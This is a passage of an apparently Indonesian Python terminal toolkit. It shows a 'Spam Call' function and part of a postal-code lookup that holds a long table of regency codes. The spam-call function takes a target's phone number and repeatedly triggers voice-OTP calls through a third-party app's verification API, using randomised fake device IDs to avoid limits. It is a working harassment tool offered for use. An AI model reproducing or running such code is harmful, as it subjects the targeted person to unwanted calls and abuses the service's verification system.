    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣤⣤⣤⣤⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠿⠿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⣶⣦⣤⣀⠀⠀⠀⠉⠻⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠻⠿⣿⣿⣿⣿⣦⣄⠀⠀⠈⠻⣿⣿⣷⡄⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣷⣄⠀⠀⠘⢿⣿⣿⣆⠀⠀⠀
⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣶⣦⣄⡀⠀⠀⠙⢿⣿⣿⣦⠀⠀⠈⢿⣿⣿⡆⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣦⡀⠀⠀⠻⣿⣿⣧⠀⠀⠈⣿⣿⣿⡀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣿⣷⡀⠀⠀⢻⣿⣿⡆⠀⠀⢸⣿⣿⡇⠀
⠀⠸⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣧⠀⠀⠈⣿⣿⣷⠀⠀⠀⣿⣿⣿⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀⠙⠛⠁⠀⠀⠀⠙⠛⠁⠀
⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⠿⣿⣿⣿⣿⣿⡿⠿⠋⠁⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_call}" | lolcat')
    print(f"""
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}: {G}Spam Call 
{W}╰────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}Nomor{W} Target{N}")
    print(f"{W}│ Contoh {G}:{W} 62xxxxx{N}")
    print(f"{W}╰────────────────────────────────────────────────────────────────╯{N}")
    nomor_hp = input(f"{U}❯❯❯{W} Masukkan Nomor{G}❯{W} ").strip()
    
    if not nomor_hp:
        print(f"\n{R}✗ Nomor tidak boleh kosong!{N}")
        time.sleep(2)
        return
    
    if not nomor_hp.startswith('62'):
        print(f"\n{R}✗ Nomor harus dimulai dengan 62xx!{N}")
        time.sleep(2)
        return
    
    print(f"\n{G}✓ Target: {C}{nomor_hp}{N}")
    
    confirm = input(f"\n{W}Mulai spam call? (y/n): {N}")
    if confirm.lower() != 'y':
        print(f"\n{Y}[!] Dibatalkan{N}")
        time.sleep(1)
        return
    
    def kirim_call(nomor):
        url = "https://gateway.ukuindo.com/entrance/v3/getcode"
        random_imei = ''.join(random.choices(string.hexdigits.lower(), k=32))
        
        headers = {
            "Host": "gateway.ukuindo.com",
            "Accept": "application/json",
            "Device": "ANDROID",
            "Imei": random_imei,
            "Version": "6092201",
            "Versioncode": "6.9.22",
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.9.2"
        }
        
        payload = {
            "phone": nomor,
            "smsType": "VOICE_SMS",
            "channel": "GooglePlay",
            "appInstanceId": ""
        }
        
        try:
            response = requests.post(url, headers=headers, json=payload, timeout=15)
            data = response.json()
            if data.get('success') == True:
                return True
            return False
        except:
            return False

    try:
        total_kirim = 10
        countdown_detik = 25
        
        def loadbar(stop_event):
            COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
            RESET = '\x1b[0m'
            length = 10
            color_index = 0
            while not stop_event.is_set():
                for i in range(length + 1):
                    if stop_event.is_set():
                        break
                    filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                    empty = '□' * (length - i)
                    sys.stdout.write(f'\r [ {G}✦{W} ] Sedang Mengirim Call [[{filled_color}{empty}{W}]]')
                    sys.stdout.flush()
                    time.sleep(0.05)
                    color_index += 1
            sys.stdout.write('\r' + ' ' * 120 + '\r')
            sys.stdout.flush()
        
        stop_loading = threading.Event()
        loading_thread = threading.Thread(target=loadbar, args=(stop_loading,))
        loading_thread.daemon = True
        loading_thread.start()
        
        for i in range(1, total_kirim + 1):
            kirim_call(nomor_hp)
            if i < total_kirim:
                time.sleep(countdown_detik)
        
        stop_loading.set()
        loading_thread.join()
        
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ [ {G}✓{W} ] Succesfuly Spam Call {G}✓{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        
        input(f"\n{W}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return
        
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Kembali Ke {G}Mikasa{W}...{N}")
        time.sleep(1)
        return
        
def cek_kode_pos():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, threading, json, requests
    
    os.system('clear')
    
    lokasi = """
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⡿⠿⠿⢿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣴⣿⢟⡛⢍⠒⡰⡈⠥⣉⠒⡌⢛⢽⣟⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⡿⣋⠒⢢⠘⠤⡙⠤⡑⣡⢂⠣⡘⢂⢆⡙⢮⣗⠿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⢋⠲⢠⠙⢢⠉⣆⣵⣶⣷⣿⣿⣷⣷⣧⣆⠜⣠⠻⣏⡷⣻⢿⣧⡀⠀
⠀⣼⣿⡑⢊⠱⠨⡌⣡⣾⠿⠋⠁⠀⠀⠀⠀⠈⠙⠻⣿⣦⠥⡹⣳⡽⣫⣿⣷⠀
⢰⣿⢣⠘⡌⡡⢃⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣷⡡⢻⣵⢻⡼⣿⣇
⣾⡿⢂⡱⢌⠰⣹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠙⣮⡗⣯⢿⣿
⣿⡇⢣⠰⣈⠒⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠡⣿⡝⣮⢿⣿
⢿⣿⢠⢃⠤⡉⢽⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⢡⡟⣾⡹⣾⣿
⠸⣿⣦⠊⡔⠩⢌⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠣⢹⣾⣱⣻⣿⠇
⠀⠹⣿⣜⢨⠑⠬⣈⠿⣿⣦⣀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⣅⢊⡿⣖⣳⣿⡟⠀
⠀⠀⠹⣿⣦⢉⠖⡠⢎⡘⠹⠿⢿⣷⣶⣶⣶⡿⢿⠛⡅⢣⠰⣸⢷⣹⣿⠟⠀⠀
⠀⠀⠀⠙⣿⣎⢆⡑⠢⢌⡱⢘⢂⡒⠰⢂⡱⢈⠦⡑⠌⢆⢱⣯⣳⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣖⡌⠱⢂⡔⠣⢌⡰⢉⡒⠤⢃⢆⠩⡘⢌⡾⣵⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣎⡑⡊⠔⣡⠒⡄⢣⢘⡐⠣⢌⠒⡩⣸⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⣖⢩⠘⡄⢣⠘⡄⠣⢌⠱⡈⢎⢱⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢊⡔⢡⢃⠬⡑⢊⠱⡈⢦⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⢈⠦⡘⠤⡑⡉⠆⢥⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢢⠑⡘⠤⡙⢌⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠩⠜⡰⢁⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠓⡄⣻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣯⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⠃"""
    os.system(f'echo "{lokasi}" | lolcat')
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {R}:{G} Rullzzz06 {W}& {G}Thxyzz404,{W} Tools {R}: {G}Cek Code Pos
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}Kode Pos{W} (5 digit){N}")
    print(f"{W}│ Contoh {G}:{W} 16112, 40121, 20241{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    kode_pos = input(f"{W}╰──{R}❯{W} ").strip()
    
    if not kode_pos:
        print(f"\n {W}[ {R}!{W} ] Pos Tidak Boleh Kosong Tekan {R}Enter{W} Untuk Kembali{N}")
        input()
        return
    
    if not kode_pos.isdigit() or len(kode_pos) != 5:
        print(f"\n{W}[ {R}!{W} ] Pos harus 5 digit/Angka Tekan {R}Enter{W} Untuk kembali{N}")
        input()
        return

    print(f"\n{G}✓ Kode Pos: {C}{kode_pos}{N}")

    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 10
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Sedang Mencari Kode Pos [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    stop_loading.set()
    loading_thread.join()
    
    try:
        url = "https://raw.githubusercontent.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v64282T7f/63b10b66cb8373e3107759f271631413aa8e18fa/kodepos.json"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data_kode_pos = response.json()
        else:
            data_kode_pos = {}
    except:
        data_kode_pos = {}
    
    kabupaten_data = {
        "1101": "Kab. Aceh Selatan",
        "1102": "Kab. Aceh Tenggara",
        "1103": "Kab. Aceh Timur",
        "1104": "Kab. Aceh Tengah",
        "1105": "Kab. Aceh Barat",
        "1106": "Kab. Aceh Besar",
        "1107": "Kab. Pidie",
        "1108": "Kab. Aceh Utara",
        "1109": "Kab. Simeulue",
        "1110": "Kab. Aceh Singkil",
        "1111": "Kab. Bireuen",
        "1112": "Kab. Aceh Barat Daya",
        "1113": "Kab. Gayo Lues",
        "1114": "Kab. Aceh Jaya",
        "1115": "Kab. Nagan Raya",
        "1116": "Kab. Aceh Tamiang",
        "1117": "Kab. Bener Meriah",
        "1118": "Kab. Pidie Jaya",
        "1171": "Kota Banda Aceh",
        "1172": "Kota Sabang",
        "1173": "Kota Lhokseumawe",
        "1174": "Kota Langsa",
        "1175": "Kota Subulussalam",
        "1201": "Kab. Tapanuli Tengah",
        "1202": "Kab. Tapanuli Utara",
        "1203": "Kab. Tapanuli Selatan",
        "1204": "Kab. Nias",
        "1205": "Kab. Langkat",
        "1206": "Kab. Karo",
        "1207": "Kab. Deli Serdang",
        "1208": "Kab. Simalungun",
        "1209": "Kab. Asahan",
        "1210": "Kab. Labuhanbatu",
        "1211": "Kab. Dairi",
        "1212": "Kab. Toba Samosir",
        "1213": "Kab. Mandailing Natal",
        "1214": "Kab. Nias Selatan",
        "1215": "Kab. Pakpak Bharat",
        "1216": "Kab. Humbang Hasundutan",
        "1217": "Kab. Samosir",
        "1218": "Kab. Serdang Bedagai",
        "1219": "Kab. Batu Bara",
        "1220": "Kab. Padang Lawas Utara",
        "1221": "Kab. Padang Lawas",
        "1222": "Kab. Labuhanbatu Selatan",
        "1223": "Kab. Labuhanbatu Utara",
        "1224": "Kab. Nias Utara",
        "1225": "Kab. Nias Barat",
        "1271": "Kota Medan",
        "1272": "Kota Pematangsiantar",
        "1273": "Kota Sibolga",
        "1274": "Kota Tanjung Balai",
        "1275": "Kota Binjai",
        "1276": "Kota Tebing Tinggi",
        "1277": "Kota Padang Sidempuan",
        "1278": "Kota Gunungsitoli",
        "1301": "Kab. Pesisir Selatan",
        "1302": "Kab. Solok",
        "1303": "Kab. Sijunjung",
        "1304": "Kab. Tanah Datar",
        "1305": "Kab. Padang Pariaman",
        "1306": "Kab. Agam",
        "1307": "Kab. Lima Puluh Kota",
        "1308": "Kab. Pasaman",
        "1309": "Kab. Kepulauan Mentawai",
        "1310": "Kab. Dharmasraya",
        "1311": "Kab. Solok Selatan",
        "1312": "Kab. Pasaman Barat",
        "1371": "Kota Padang",
        "1372": "Kota Solok",
        "1373": "Kota Sawahlunto",
        "1374": "Kota Padang Panjang",
        "1375": "Kota Bukittinggi",
        "1376": "Kota Payakumbuh",
        "1377": "Kota Pariaman",
        "1401": "Kab. Kampar",
        "1402": "Kab. Indragiri Hulu",
        "1403": "Kab. Bengkalis",
        "1404": "Kab. Indragiri Hilir",
        "1405": "Kab. Pelalawan",
        "1406": "Kab. Rokan Hulu",
        "1407": "Kab. Rokan Hilir",
        "1408": "Kab. Siak",
        "1409": "Kab. Kuantan Singingi",
        "1410": "Kab. Kepulauan Meranti",
        "1471": "Kota Pekanbaru",
        "1472": "Kota Dumai",
        "1501": "Kab. Kerinci",
        "1502": "Kab. Merangin",
        "1503": "Kab. Sarolangun",
        "1504": "Kab. Batanghari",
        "1505": "Kab. Muaro Jambi",
        "1506": "Kab. Tanjung Jabung Barat",
        "1507": "Kab. Tanjung Jabung Timur",
        "1508": "Kab. Bungo",
        "1509": "Kab. Tebo",
        "1571": "Kota Jambi",
        "1572": "Kota Sungai Penuh",
        "1601": "Kab. Ogan Komering Ulu",
        "1602": "Kab. Ogan Komering Ilir",
        "1603": "Kab. Muara Enim",
        "1604": "Kab. Lahat",
        "1605": "Kab. Musi Rawas",
        "1606": "Kab. Musi Banyuasin",
        "1607": "Kab. Banyuasin",
        "1608": "Kab. Ogan Komering Ulu Timur",
        "1609": "Kab. Ogan Komering Ulu Selatan",
        "1610": "Kab. Ogan Ilir",
        "1611": "Kab. Empat Lawang",
        "1612": "Kab. Penukal Abab Lematang Ilir",
        "1613": "Kab. Musi Rawas Utara",
        "1671": "Kota Palembang",
        "1672": "Kota Pagar Alam",
        "1673": "Kota Lubuk Linggau",
        "1674": "Kota Prabumulih",
        "1701": "Kab. Bengkulu Selatan",
        "1702": "Kab. Rejang Lebong",
        "1703": "Kab. Bengkulu Utara",
        "1704": "Kab. Kaur",
        "1705": "Kab. Seluma",
        "1706": "Kab. Muko Muko",
        "1707": "Kab. Lebong",
        "1708": "Kab. Kepahiang",
        "1709": "Kab. Bengkulu Tengah",
        "1771": "Kota Bengkulu",
        "1801": "Kab. Lampung Selatan",
        "1802": "Kab. Lampung Tengah",
        "1803": "Kab. Lampung Utara",
        "1804": "Kab. Lampung Barat",
        "1805": "Kab. Tulang Bawang",
        "1806": "Kab. Tanggamus",
        "1807": "Kab. Lampung Timur",
        "1808": "Kab. Way Kanan",
        "1809": "Kab. Pesawaran",
        "1810": "Kab. Pringsewu",
        "1811": "Kab. Mesuji",
        "1812": "Kab. Tulang Bawang Barat",
        "1813": "Kab. Pesisir Barat",
        "1871": "Kota Bandar Lampung",
        "1872": "Kota Metro",
        "1901": "Kab. Bangka",
        "1902": "Kab. Belitung",
        "1903": "Kab. Bangka Selatan",
        "1904": "Kab. Bangka Tengah",
        "1905": "Kab. Bangka Barat",
        "1906": "Kab. Belitung Timur",
        "1971": "Kota Pangkal Pinang",
        "2101": "Kab. Bintan",
        "2102": "Kab. Karimun",
        "2103": "Kab. Natuna",
        "2104": "Kab. Lingga",
        "2105": "Kab. Kepulauan Anambas",
        "2171": "Kota Batam",
        "2172": "Kota Tanjung Pinang",
        "3101": "Kab. Adm. Kep. Seribu",
        "3171": "Kota Adm. Jakarta Pusat",
        "3172": "Kota Adm. Jakarta Utara",
        "3173": "Kota Adm. Jakarta Barat",
        "3174": "Kota Adm. Jakarta Selatan",
        "3175": "Kota Adm. Jakarta Timur",
        "3201": "Kab. Bogor",
        "3202": "Kab. Sukabumi",
        "3203": "Kab. Cianjur",
        "3204": "Kab. Bandung",
        "3205": "Kab. Garut",
        "3206": "Kab. Tasikmalaya",
        "3207": "Kab. Ciamis",
        "3208": "Kab. Kuningan",
        "3209": "Kab. Cirebon",
        "3210": "Kab. Majalengka",
        "3211": "Kab. Sumedang",
        "3212": "Kab. Indramayu",
        "3213": "Kab. Subang",
        "3214": "Kab. Purwakarta",
        "3215": "Kab. Karawang",
        "3216": "Kab. Bekasi",
        "3217": "Kab. Bandung Barat",
        "3218": "Kab. Pangandaran",
        "3271": "Kota Bogor",
        "3272": "Kota Sukabumi",
        "3273": "Kota Bandung",
        "3274": "Kota Cirebon",
        "3275": "Kota Bekasi",
        "3276": "Kota Depok",
        "3277": "Kota Cimahi",
        "3278": "Kota Tasikmalaya",
        "3279": "Kota Banjar",
        "3301": "Kab. Cilacap",
        "3302": "Kab. Banyumas",
        "3303": "Kab. Purbalingga",
        "3304": "Kab. Banjarnegara",
        "3305": "Kab. Kebumen",
        "3306": "Kab. Purworejo",
        "3307": "Kab. Wonosobo",
        "3308": "Kab. Magelang",
        "3309": "Kab. Boyolali",
        "3310": "Kab. Klaten",
        "3311": "Kab. Sukoharjo",
        "3312": "Kab. Wonogiri",
        "3313": "Kab. Karanganyar",
        "3314": "Kab. Sragen",
        "3315": "Kab. Grobogan",
        "3316": "Kab. Blora",
        "3317": "Kab. Rembang",
        "3318": "Kab. Pati",
        "3319": "Kab. Kudus",
        "3320": "Kab. Jepara",
        "3321": "Kab. Demak",
        "3322": "Kab. Semarang",
        "3323": "Kab. Temanggung",
        "3324": "Kab. Kendal",
        "3325": "Kab. Batang",
        "3326": "Kab. Pekalongan",
        "3327": "Kab. Pemalang",
        "3328": "Kab. Tegal",
        "3329": "Kab. Brebes",
        "3371": "Kota Magelang",
        "3372": "Kota Surakarta",
        "3373": "Kota Salatiga",
        "3374": "Kota Semarang",
        "3375": "Kota Pekalongan",
        "3376": "Kota Tegal",
        "3401": "Kab. Kulon Progo",
        "3402": "Kab. Bantul",
        "3403": "Kab. Gunungkidul",
        "3404": "Kab. Sleman",
        "3471": "Kota Yogyakarta",
        "3501": "Kab. Pacitan",
        "3502": "Kab. Ponorogo",
        "3503": "Kab. Trenggalek",
        "3504": "Kab. Tulungagung",
        "3505": "Kab. Blitar",
        "3506": "Kab. Kediri",
        "3507": "Kab. Malang",
        "3508": "Kab. Lumajang",
        "3509": "Kab. Jember",
        "3510": "Kab. Banyuwangi",
        "3511": "Kab. Bondowoso",
        "3512": "Kab. Situbondo",
        "3513": "Kab. Probolinggo",
        "3514": "Kab. Pasuruan",
        "3515": "Kab. Sidoarjo",
        "3516": "Kab. Mojokerto",
        "3517": "Kab. Jombang",
        "3518": "Kab. Nganjuk",
        "3519": "Kab. Madiun",
        "3520": "Kab. Magetan",
        "3521": "Kab. Ngawi",
        "3522": "Kab. Bojonegoro",
        "3523": "Kab. Tuban",
        "3524": "Kab. Lamongan",
        "3525": "Kab. Gresik",
        "3526": "Kab. Bangkalan",
        "3527": "Kab. Sampang",
        "3528": "Kab. Pamekasan",
        "3529": "Kab. Sumenep",
        "3571": "Kota Kediri",
        "3572": "Kota Blitar",
        "3573": "Kota Malang",
        "3574": "Kota Probolinggo",
        "3575": "Kota Pasuruan",
        "3576": "Kota Mojokerto",
        "3577": "Kota Madiun",
        "3578": "Kota Surabaya",
        "3579": "Kota Batu",
        "3601": "Kab. Pandeglang",
        "3602": "Kab. Lebak",
        "3603": "Kab. Tangerang",
        "3604": "Kab. Serang",
        "3671": "Kota Tangerang",
        "3672": "Kota Cilegon",
        "3673": "Kota Serang",
        "3674": "Kota Tangerang Selatan",
        "5101": "Kab. Jembrana",
        "5102": "Kab. Tabanan",
        "5103": "Kab. Badung",
        "5104": "Kab. Gianyar",
        "5105": "Kab. Klungkung",
        "5106": "Kab. Bangli",
        "5107": "Kab. Karangasem",
        "5108": "Kab. Buleleng",
        "5171": "Kota Denpasar",
        "5201": "Kab. Lombok Barat",
        "5202": "Kab. Lombok Tengah",
        "5203": "Kab. Lombok Timur",
        "5204": "Kab. Sumbawa",
        "5205": "Kab. Dompu",
        "5206": "Kab. Bima",
        "5207": "Kab. Sumbawa Barat",
        "5208": "Kab. Lombok Utara",
        "5271": "Kota Mataram",
        "5272": "Kota Bima",
        "5301": "Kab. Kupang",
        "5302": "Kab Timor Tengah Selatan",
        "5303": "Kab. Timor Tengah Utara",
        "5304": "Kab. Belu",
        "5305": "Kab. Alor",
        "5306": "Kab. Flores Timur",
        "5307": "Kab. Sikka",
        "5308": "Kab. Ende",
        "5309": "Kab. Ngada",
        "5310": "Kab. Manggarai",
        "5311": "Kab. Sumba Timur",
        "5312": "Kab. Sumba Barat",
        "5313": "Kab. Lembata",
        "5314": "Kab. Rote Ndao",
        "5315": "Kab. Manggarai Barat",
        "5316": "Kab. Nagekeo",
        "5317": "Kab. Sumba Tengah",
        "5318": "Kab. Sumba Barat Daya",
        "5319": "Kab. Manggarai Timur",
        "5320": "Kab. Sabu Raijua",
        "5321": "Kab. Malaka",
        "5371": "Kota Kupang",
        "6101": "Kab. Sambas",
        "6102": "Kab. Mempawah",
        "6103": "Kab. Sanggau",
        "6104": "Kab. Ketapang",
        "6105": "Kab. Sintang",
        "6106": "Kab. Kapuas Hulu",
        "6107": "Kab. Bengkayang",
        "6108": "Kab. Landak",
        "6109": "Kab. Sekadau",
        "6110": "Kab. Melawi",
        "6111": "Kab. Kayong Utara",
        "6112": "Kab. Kubu Raya",
        "6171": "Kota Pontianak",
        "6172": "Kota Singkawang",
        "6201": "Kab. Kotawaringin Barat",
        "6202": "Kab. Kotawaringin Timur",
        "6203": "Kab. Kapuas",
        "6204": "Kab. Barito Selatan",
        "6205": "Kab. Barito Utara",
        "6206": "Kab. Katingan",
        "6207": "Kab. Seruyan",
        "6208": "Kab. Sukamara",
        "6209": "Kab. Lamandau",
        "6210": "Kab. Gunung Mas",
        "6211": "Kab. Pulang Pisau",
        "6212": "Kab. Murung Raya",
        "6213": "Kab. Barito Timur",
        "6271": "Kota Palangkaraya",
        "6301": "Kab. Tanah Laut",
        "6302": "Kab. Kotabaru",
        "6303": "Kab. Banjar",
        "6304": "Kab. Barito Kuala",
        "6305": "Kab. Tapin",
        "6306": "Kab. Hulu Sungai Selatan",
        "6307": "Kab. Hulu Sungai Tengah",
        "6308": "Kab. Hulu Sungai Utara",
        "6309": "Kab. Tabalong",
        "6310": "Kab. Tanah Bumbu",
        "6311": "Kab. Balangan",
        "6371": "Kota Banjarmasin",
        "6372": "Kota Banjarbaru",
        "6401": "Kab. Paser",
        "6402": "Kab. Kutai Kartanegara",
        "6403": "Kab. Berau",
        "6407": "Kab. Kutai Barat",
        "6408": "Kab. Kutai Timur",
        "6409": "Kab. Penajam Paser Utara",
        "6411": "Kab. Mahakam Ulu",
        "6471": "Kota Balikpapan",
        "6472": "Kota Samarinda",
        "6474": "Kota Bontang",
        "6501": "Kab. Bulungan",
        "6502": "Kab. Malinau",
        "6503": "Kab. Nunukan",
        "6504": "Kab. Tana Tidung",
        "6571": "Kota Tarakan",
        "7101": "Kab. Bolaang Mongondow",
        "7102": "Kab. Minahasa",
        "7103": "Kab. Kepulauan Sangihe",
        "7104": "Kab. Kepulauan Talaud",
        "7105": "Kab. Minahasa Selatan",
        "7106": "Kab. Minahasa Utara",
        "7107": "Kab. Minahasa Tenggara",
        "7108": "Kab. Bolaang Mongondow Utara",
        "7109": "Kab. Kep. Siau Tagulandang Biaro",
        "7110": "Kab. Bolaang Mongondow Timur",
        "7111": "Kab. Bolaang Mongondow Selatan",
        "7171": "Kota Manado",
        "7172": "Kota Bitung",
        "7173": "Kota Tomohon",
        "7174": "Kota Kotamobagu",
        "7201": "Kab. Banggai",
        "7202": "Kab. Poso",
        "7203": "Kab. Donggala",
        "7204": "Kab. Toli Toli",
        "7205": "Kab. Buol",
        "7206": "Kab. Morowali",
        "7207": "Kab. Banggai Kepulauan",
        "7208": "Kab. Parigi Moutong",
        "7209": "Kab. Tojo Una Una",
        "7210": "Kab. Sigi",
        "7211": "Kab. Banggai Laut",
        "7212": "Kab. Morowali Utara",
        "7271": "Kota Palu",
        "7301": "Kab. Kepulauan Selayar",
        "7302": "Kab. Bulukumba",
        "7303": "Kab. Bantaeng",
        "7304": "Kab. Jeneponto",
        "7305": "Kab. Takalar",
        "7306": "Kab. Gowa",
        "7307": "Kab. Sinjai",
        "7308": "Kab. Bone",
        "7309": "Kab. Maros",
        "7310": "Kab. Pangkajene Kepulauan",
